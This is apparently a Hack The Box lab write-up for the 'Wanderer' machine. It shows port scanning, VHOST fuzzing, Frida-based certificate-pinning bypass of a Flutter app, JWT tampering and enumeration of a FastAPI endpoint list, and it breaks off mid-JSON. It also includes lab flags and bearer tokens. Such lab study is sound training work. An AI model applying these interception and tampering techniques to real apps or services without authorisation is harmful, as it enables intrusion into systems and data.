Immediately from the TCP scan i can see this is the mobile server:

```bash
ORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7f:3f:8c:ae:ef:08:ac:ee:e0:c8:3f:e8:34:d1:36:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOWvqtDA5f2MBy7e1ljrmFbEA2hDB66IDYMvcVjQ6sq+I7ptxC3Pwgj+sKm3ilSAi7u22JNaYThkw/7RItM6jGc=
|   256 d4:05:69:8c:18:62:c1:90:67:d9:5f:0a:1c:3d:9f:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEPQhoLqOZFuWC8qOd1EY6xnZvMlD7PO+W0X/93x1Z8u
443/tcp open  ssl/http syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=mobile-api.wanderer.htb/organizationName=Wanderer/stateOrProvinceName=NV/countryName=US/localityName=Las Vegas
| Issuer: commonName=mobile-api.wanderer.htb/organizationName=Wanderer/stateOrProvinceName=NV/countryName=US/localityName=Las Vegas
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-04T02:28:10
| Not valid after:  2044-07-07T02:28:10
| MD5:     4734 789f 1aac d339 c1fc 5480 0714 5ab1
| SHA-1:   826c d800 7e88 fc1f 9491 0b44 7aaf aae4 ab6e 4f3e
| SHA-256: 0ad8 091e 0886 976f aebd 4193 752a a9ff 0f51 780c b94b 863c d60a da58 f8cf 1c88
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo+gAwIBAgIULkbugfXqzkqyiiDoUprmsx+pP8IwDQYJKoZIhvcNAQEL
| BQAwYzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5WMRIwEAYDVQQHDAlMYXMgVmVn
| YXMxETAPBgNVBAoMCFdhbmRlcmVyMSAwHgYDVQQDDBdtb2JpbGUtYXBpLndhbmRl
| cmVyLmh0YjAeFw0yNTAzMDQwMjI4MTBaFw00NDA3MDcwMjI4MTBaMGMxCzAJBgNV
| BAYTAlVTMQswCQYDVQQIDAJOVjESMBAGA1UEBwwJTGFzIFZlZ2FzMREwDwYDVQQK
| DAhXYW5kZXJlcjEgMB4GA1UEAwwXbW9iaWxlLWFwaS53YW5kZXJlci5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC29hVZdiHJVtthq9D4U+BoxIlJ
| IkpDZLRjbCmNMbrefnghRFW5jbvOSWSTGeCWM4KT7q+xUWWBa/+djzCR0Puqfo1B
| +N5c3kJvcshud+v4WP5NVW+EfoYBn6L3lLj0MYSr4DOMIquRvyinNVfkKgJKBBn4
| 1O+8m3qbIdjmtPLrP0b4mzZHLOCldLwlR3VHmKHb5HyY3PGpg151kAhbgR9AAnx4
| yicNXAixp0ukOugCnE9fTdHwONSJqDdeyjmSHSj8bqHLgj/CZqvUM2PUjMWShjNX
| PNfFKqiCAJRPBgZLks3zReeP3MIAN6I9QW1j2UlbJzDDDrk9qWDdyil6Bbj7AgMB
| AAGjUzBRMB0GA1UdDgQWBBSZQH0jzogZydX18tzULRrhtDsCVDAfBgNVHSMEGDAW
| gBSZQH0jzogZydX18tzULRrhtDsCVDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
| DQEBCwUAA4IBAQCnsyYRn52ye3yuIl9/gDp2Um4omGmSATWip1FgUj+wP/OqSI1M
| z+4DCcUolk1ROo0Fp07ybXYWBznbesPOjK5XajEEfN0dZt/8ROdXtna1Hwwdcysm
| S00mjZnRhNdPtFRrs+5k3pXPRpZcnmKRDjrh4f1eykT2a6NQvpY/931bG8q+A2SE
| YY/i4WWf1+n/bcK27AJ2e2soXONelkg8VZ6AZQK3o75+VaUdXUxc+4+HGruARxKZ
| hNHIGxtd4wa5CvKfPYrhgdQn8I5C6ENV1ZJ7slj/MSm6+RpH+NPtbMqTpU3HbRxW
| zQo/5SnjVnZHcWB9SAjRDhWXR4p5Fsl35JOv
|_-----END CERTIFICATE-----
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X (90%), MikroTik RouterOS 7.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.19 - 5.15 (90%), Linux 5.10 (85%), Linux 4.15 - 5.19 (85%), Linux 5.0 - 5.14 (85%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=4/7%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69D4D869%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%II=RI%TS=A)
SEQ(SP=107%GCD=1%ISR=10C%TI=Z%II=RI%TS=A)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

```

# HTTPS

The first check is to see exactly what can i see here if I use the VHOST from the certificate? Well not much...  
![4b54f58e3ca592b70fc3ab1eed2d0ab9.png](../../../_resources/4b54f58e3ca592b70fc3ab1eed2d0ab9.png)

A quick scan shows no traces of custom VHOST other than the one I already have. Or at least, If i am even using the correct one...

```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://api.wanderer.htb/ -H "Host:FUZZ.wanderer.htb" -fl 26

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://api.wanderer.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.wanderer.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 26
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1724 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Wanderer]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://api.wanderer.htb/ -H "Host:FUZZ.api.wanderer.htb" -fl 26

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://api.wanderer.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.api.wanderer.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 26
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1724 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

Ok, then what about custom web folders then? Seems like no, this must mean that i am using the wrong VHOST or the goal with this machine is getting in via SSH instead?

```bash
└─$ dirsearch -u "https://api.wanderer.htb/" --crawl
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/Downloads/Wanderer/reports/https_api.wanderer.htb/__26-04-07_14-53-40.txt

Target: https://api.wanderer.htb/

[14:53:40] Starting: 

Task Completed

```

# Digging the APK

Now I will try to install the APK in my Waydroid simulator and see what is the fuzz about. But I do not see anything?

```
──(millycash㉿kali-bello)-[~/Downloads/Wanderer]
└─$ waydroid app install peoplelookup.apk
```

I suspect the application has to be digitally signed first, but I will upload the APK to the waydroid and try to install it from the GUI instead.

```
┌──(millycash㉿kali-bello)-[~/Downloads/Wanderer]
└─$ sudo cp peoplelookup.apk ~/.local/share/waydroid/data/media/0/Download/                                            
[sudo] password for millycash:
```

And it seems it was only an message to allow?  
![dabc3d7a68ebe57763fe1ccf85b96381.png](../../../_resources/dabc3d7a68ebe57763fe1ccf85b96381.png)

And it looks only like a contacts book?

![b0656425c35b64a0ec4d228ac70c5c35.png](../../../_resources/b0656425c35b64a0ec4d228ac70c5c35.png)

I think it is time now to drill down the application and check for stuff, as I suspect I will be moving to Asterisk later on.  Remember to target either the user Benny or Gizmo as those are high value targets.

Now I had an idea to check the ADB logcat and see what it is happening when execuing an application and I see that it tried to reach this IP?

```
5.708   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1403, 792) on display 0.
04-08 14:02:45.710   296   388 D InputDispatcher: No new touched window at (1403, 793) in display 0
04-08 14:02:45.710   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1403, 793) on display 0.
04-08 14:02:45.712  2109  2125 E OpenGLRenderer: Device claims wide gamut support, cannot find matching config, error = EGL_SUCCESS
04-08 14:02:45.712  2109  2125 W OpenGLRenderer: Failed to initialize 101010-2 format, error = EGL_SUCCESS
04-08 14:02:45.717    37    37 I servicemanager: Could not find android.hardware.graphics.allocator.IAllocator/default in the VINTF manifest.
04-08 14:02:45.717   111   198 E HWComposer: getSupportedContentTypes: getSupportedContentTypes failed for display 0: Unsupported (8)
04-08 14:02:45.719   296   388 D InputDispatcher: No new touched window at (1402, 793) in display 0
04-08 14:02:45.719   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1402, 793) on display 0.
04-08 14:02:45.720   101   185 V [minigbm:gbm_mesa_internals.cpp(382)]: Allocated: 2560x1333, stride: 10240, map_stride: 0
04-08 14:02:45.720  2109  2125 E OpenGLRenderer: Unable to match the desired swap behavior.
04-08 14:02:45.720   296   388 D InputDispatcher: No new touched window at (1401, 793) in display 0
04-08 14:02:45.720   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1401, 793) on display 0.
04-08 14:02:45.722   296   388 D InputDispatcher: No new touched window at (1401, 794) in display 0
04-08 14:02:45.722   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1401, 794) on display 0.
04-08 14:02:45.731   296   388 D InputDispatcher: No new touched window at (1400, 794) in display 0
04-08 14:02:45.731   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1400, 794) on display 0.
04-08 14:02:45.735  2109  2131 I flutter : Error looking up host, defaulting to 10.10.110.25
04-08 14:02:45.735  2109  2131 I flutter : https://10.10.110.25/65923fad8eba57a06604c27a4fb46f70/user/login
04-08 14:02:45.738   296   388 D InputDispatcher: No new touched window at (1399, 794) in display 0
04-08 14:02:45.738   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1399, 794) on display 0.
04-08 14:02:45.741  2109  2109 E SurfaceSyncer: Failed to find sync for id=0
04-08 14:02:45.744   101   185 V [minigbm:gbm_mesa_internals.cpp(382)]: Allocated: 2560x1333, stride: 10240, map_stride: 0
04-08 14:02:45.746   101   184 V [minigbm:gbm_mesa_internals.cpp(382)]: Allocated: 2560x1396, stride: 10240, map_stride: 0
04-08 14:02:45.748   296   388 D InputDispatcher: No new touched window at (1399, 795) in display 0
04-08 14:02:45.748   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1399, 795) on display 0.
04-08 14:02:45.749   296   388 D InputDispatcher: No new touched window at (1397, 795) in display 0
04-08 14:02:45.749   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1397, 795) on display 0.
04-08 14:02:45.750   296   388 D InputDispatcher: No new touched window at (1396, 795) in display 0
04-08 14:02:45.750   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1396, 795) on display 0.
04-08 14:02:45.754   296   326 I ActivityTaskManager: Displayed com.wanderer.people_lookup/.MainActivity: +160ms
04-08 14:02:45.755   296   326 I ActivityTaskManager: Fully drawn com.wanderer.people_lookup/.MainActivity: +160ms
04-08 14:02:45.756   296   388 D InputDispatcher: No new touched window at (1395, 796) in display 0
04-08 14:02:45.756   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1395, 796) on display 0.
04-08 14:02:45.763   296  1902 D CompatibilityChangeReporter: Compat change id reported: 214016041; UID 10126; state: ENABLED
04-08 14:02:45.779   111   202 W TransactionTracing: Could not find layer handle 0x7f9239c41db0
04-08 14:02:45.850  2109  2131 I flutter : fetching users
04-08 14:02:45.858  2109  2131 I flutter : Error looking up host, defaulting to 10.10.110.25
04-08 14:02:45.961  2109  2131 I flutter : fetching users
04-08 14:02:46.111   296   400 D CoreBackPreview: Window{c785217 u0 com.wanderer.people_lookup/SplashScreen EXITING}: Setting back callback null
04-08 14:02:46.111   296  1902 W InputManager-JNI: Input channel object 'c785217 com.wanderer.people_lookup/SplashScreen (client)' was disposed without first being removed with the input manager!
04-08 14:02:46.279   111   202 W TransactionTracing: Could not find layer handle 0x7f9239c33590
04-08 14:02:56.399  2109  2109 W Choreographer: Frame time is 0.093593 ms in the future!  C
```

Specifically this is the host I need to reach and a quick check at the code obtained by APK tool decypt I can see the real name of the local VHOST?

```
└─$ strings lib/x86_64/libapp.so | grep -E "htb|wanderer"
Resolved mobile-api.wanderer.htb to: 
mobile-api.wanderer.htb
```

And I see that now after I added to localhosts file I can resolve the IP and I can see it performs a sort of proxy somehow?

```
04-08 14:20:09.687   296  1902 D CoreBackPreview: Window{773a27a u0 com.wanderer.people_lookup/com.wanderer.people_lookup.MainActivity}: Setting back callback OnBackInvokedCallbackInfo{mCallback=android.window.IOnBackInvokedCallback$Stub$Proxy@73b1e88, mPriority=0}
04-08 14:20:09.689  2290  2312 I flutter : logging in users
04-08 14:20:09.690  2290  2312 I flutter : Resolved mobile-api.wanderer.htb to: 10.10.110.25
04-08 14:20:09.690  2290  2312 I flutter : https://mobile-api.wanderer.htb/65923fad8eba57a06604c27a4fb46f70/user/login
04-08 14:20:09.693  2290  2306 E OpenGLRenderer: Device claims wide gamut support, cannot find matching config, error = EGL_SUCCESS
04-08 14:20:09.693  2290  2306 W OpenGLRenderer: Failed to initialize 101010-2 format, error = EGL_SUCCESS
04-08 14:20:09.697    37    37 I servicemanager: Could not find android.hardware.graphics.allocator.IAllocator/default in the VINTF manifest.
04-08 14:20:09.698   111   198 E HWComposer: getSupportedContentTypes: getSupportedContentTypes failed for display 0: Unsupported (8)
04-08 14:20:09.699   101   184 V [minigbm:gbm_mesa_internals.cpp(382)]: Allocated: 2560x1333, stride: 10240, map_stride: 0
04-08 14:20:09.699  2290  2306 E OpenGLRenderer: Unable to match the desired swap behavior.
04-08 14:20:09.705   296   388 D InputDispatcher: No new touched window at (1382, 775) in display 0
04-08 14:20:09.705   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1382, 775) on display 0.
04-08 14:20:09.716  2290  2290 E SurfaceSyncer: Failed to find sync for id=0
04-08 14:20:09.717   296   388 D InputDispatcher: No new touched window at (1381, 775) in display 0
04-08 14:20:09.717   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1381, 775) on display 0.
04-08 14:20:09.720   101   184 V [minigbm:gbm_mesa_internals.cpp(382)]: Allocated: 2560x1396, stride: 10240, map_stride: 0
04-08 14:20:09.728   296   326 I ActivityTaskManager: Displayed com.wanderer.people_lookup/.MainActivity: +123ms
04-08 14:20:09.728   296   326 I ActivityTaskManager: Fully drawn com.wanderer.people_lookup/.MainActivity: +123ms
04-08 14:20:09.739   296   388 D InputDispatcher: No new touched window at (1381, 776) in display 0
04-08 14:20:09.739   296   388 I InputDispatcher: Dropping event because there is no touchable window at (1381, 776) on display 0.
04-08 14:20:09.741   296  1627 D CompatibilityChangeReporter: Compat change id reported: 214016041; UID 10126; state: ENABLED
04-08 14:20:09.924  2290  2312 I flutter : fetching users
04-08 14:20:09.924  2290  2312 I flutter : Resolved mobile-api.wanderer.htb to: 10.10.110.25
04-08 14:20:09.939   101   184 V [minigbm:gbm_mesa_internals.cpp(382)]: Allocated: 2560x1333, stride: 10240, map_stride: 0
04-08 14:20:10.088   296  1902 D CoreBackPreview: Window{61108be u0 com.wanderer.people_lookup/SplashScreen EXITING}: Setting back callback null
04-08 14:20:10.089   296  1627 W InputManager-JNI: Input channel object '61108be com.wanderer.people_lookup/SplashScreen (client)' was disposed without first being removed with the input manager!
04-08 14:20:10.176  2290  2312 I flutter : fetching users
```

Now since that **libapp.so** is where the "magic" happens I need to export the data, and here I was tryng hard to redirect the HTTP traffic from the custom application in the Waydroid back to my Burpsuite but it have never worked and I saw from the Discord channel that someone suggested to use Android studio instead and OMG it actually worked so what I did I enabled in Burpsuite to listen on all itnerfaces:

![797e48a5383e6396b5908182a2e7adcb.png](../../../_resources/797e48a5383e6396b5908182a2e7adcb.png)

Now here I lost a whole day but eventually I made it working by pushing a frida-server on the ADB device and executed as root(this is extremely important otherwise the exploit will timeout):

```bash
127|vbox86p:/data/local/tmp # ls -al
total 108212
drwxrwx--x 2 shell shell      4096 2026-04-10 07:23 .
drwxr-x--x 4 root  root       4096 2026-04-10 07:03 ..
-rw-rw-rw- 1 root  root  110787848 2026-04-10 07:22 frida-server
vbox86p:/data/local/tmp # chmod +x frida-server                                                                                                                                                                                                              
vbox86p:/data/local/tmp # ./frida-server -l 0.0.0.0                                                                                                                                                                                                          



```

I setup a new "invisible" proxy listener in BurpSuite that listens on all NICS and I used [this](https://github.com/hackcatml/frida-flutterproxy) tool to patch the flutter application. I updated the flutterproxy script to match the address on the new Burp Proxy:

```bash
                }
            }, 0);
        }
    }

    BURP_PROXY_IP = "192.168.56.1";
    BURP_PROXY_PORT = 8083;

    awaitForCondition(init);
}
/* main */
```

And I can call the Frida with the new plugin, check from logs that the proxy is indeed polluted in the application:

```bash
user@user-host:~/Downloads/frida-flutterproxy$ frida -Uf  com.wanderer.people_lookup -l script.js
     ____
    / _  |   Frida 17.9.1 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Phone (id=192.168.56.104:5555)
Spawned `com.wanderer.people_lookup`. Resuming main thread!             
[Phone::com.wanderer.people_lookup ]-> [*] libflutter.so loaded!
[*] libflutter.so base: 0x783bd0c82000
[*] package name: com.wanderer.people_lookup
[*] Socket_CreateConnect string pattern found at: 0x783bd0d7fa8a
[*] ssl_client string pattern found at: 0x783bd0d7e83c
[*] scan memory done
[*] Found Socket_CreateConnect function address: 0x783bd13c9570
[*] Found GetSockAddr function address: 0x783bd13d03d0
[*] Hook GetSockAddr function
[*] scan memory done
[*] scan memory done
[*] Found lea rdi rip address: 0x783bd12ebd9f
[*] Found verify_cert_chain function address: 0x783bd12ebc8e
[*] Hook verify_cert_chain function
[*] Overwrite sockaddr as our burp proxy ip and port --> 192.168.56.1:8083
[*] scan memory done

```

And now I can immediately se the callback i needed upon user fetch, and it is another flag:

```http
POST /65923fad8eba57a06604c27a4fb46f70/user/login HTTP/1.1
Host: 10.10.110.25
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imdpem1vIiwiYWNjZXNzX2xldmVsIjoyfQ.OupRZ2ADNkuwUp0T6fzjkpNdnvXwWVadUMxmWixvo0A
Content-Type: application/json
Content-Length: 71

{"username":"guest","password":"HTB{6b9c31208663e59464460f78e4b79aff}"}
```

But I can also see the actual request that the tool is doing in order to fetch the phone-book list:

```http
GET /65923fad8eba57a06604c27a4fb46f70/phones/ HTTP/1.1
user-agent: Dart/3.0 (dart:io)
Accept-Encoding: gzip, deflate, br
authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiYWNjZXNzX2xldmVsIjowfQ.bTww7mEpsv_sAkozFOiCegrEmV3uBhh9mxXChYpquOs
host: 10.10.110.25
Connection: keep-alive


```

# Enumerating the API

The first idea is to check what happens if I tamper the Access level in the JWT:

![536c9d92db8f40c02dab159e9b402ee8.png](../../../_resources/536c9d92db8f40c02dab159e9b402ee8.png)

Seems like the application doesn't like it at all!  
![a9aa0b8fcc512cb61eed4fac2610f27a.png](../../../_resources/a9aa0b8fcc512cb61eed4fac2610f27a.png)

Next, i need to footprint what endpoitns are available and looks like it is possible see that the backend is FastAPI?

```bash
Target: https://10.10.110.25/

[11:56:43] Starting: 65923fad8eba57a06604c27a4fb46f70/
[11:56:44] 404 -  564B  - /65923fad8eba57a06604c27a4fb46f70/%2e%2e//google.com
[11:57:02] 200 -  974B  - /65923fad8eba57a06604c27a4fb46f70/docs
[11:57:02] 307 -    0B  - /65923fad8eba57a06604c27a4fb46f70/docs/  ->  http://localhost/docs
[11:57:13] 200 -    6KB - /65923fad8eba57a06604c27a4fb46f70/openapi.json
[11:57:17] 200 -  767B  - /65923fad8eba57a06604c27a4fb46f70/redoc
[11:57:23] 307 -    0B  - /65923fad8eba57a06604c27a4fb46f70/user  ->  http://localhost/user/
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/3
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/0
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/1
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/signup
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/admin
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/2
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/admin.php
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/login.jsp
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/login.html
[11:57:24] 307 -    0B  - /65923fad8eba57a06604c27a4fb46f70/user/login/  ->  http://localhost/user/login
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/login.aspx
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/login.js
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/
[11:57:24] 401 -   25B  - /65923fad8eba57a06604c27a4fb46f70/user/login.php

```

And surfinf that OpenApi.json shows me the current list over all the endpoints;

```json
{
  "openapi": "3.0.2",
  "info": {
    "title": "FastAPI",
    "version": "0.1.0"
  },
  "paths": {
    "/phones/": {
      "get": {
        "tags": [
          "phones"
        ],
        "summary": "List Phones",
        "operationId": "list_phones_phones__get",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "responses": {
          "200": {
            "description": "List all phones",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      },
      "post": {
        "tags": [
          "phones"
        ],
        "summary": "Create Number",
        "operationId": "create_number_phones__post",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/PhoneModel"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Add new number",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/phones/{id}": {
      "get": {
        "tags": [
          "phones"
        ],
        "summary": "Show Task",
        "operationId": "show_task_phones__id__get",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Id",
              "type": "string"
            },
            "name": "id",
            "in": "path"
          },
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "responses": {
          "200": {
            "description": "Get a single phone",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      },
      "put": {
        "tags": [
          "phones"
        ],
        "summary": "Update Phone",
        "operationId": "update_phone_phones__id__put",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Id",
              "type": "string"
            },
            "name": "id",
            "in": "path"
          },
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/UpdatePhoneModel"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Update a phone",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      },
      "delete": {
        "tags": [
          "phones"
        ],
        "summary": "Delete Task",
        "operationId": "delete_task_phones__id__delete",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Id",
              "type": "string"
            },
            "name": "id",
            "in": "path"
          },
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "responses": {
          "200": {
            "description": "Delete Phone",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/user/{id}": {
      "get": {
        "tags": [
          "user"
        ],
        "summary": "Show User",
        "operationId": "show_user_user__id__get",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Id",
              "type": "string"
            },
            "name": "id",
            "in": "path"
          },
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "responses": {
          "200": {
            "description": "Get a single user",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/user/": {
      "get": {
        "tags": [
          "user"
        ],
        "summary": "List Users",
        "operationId": "list_users_user__get",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "responses": {
          "200": {
            "description": "List all users",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      },
      "post": {
        "tags": [
          "user"
        ],
        "summary": "Create User",
        "operationId": "create_user_user__post",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Authorization",
              "type": "string"
            },
            "name": "authorization",
            "in": "header"
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
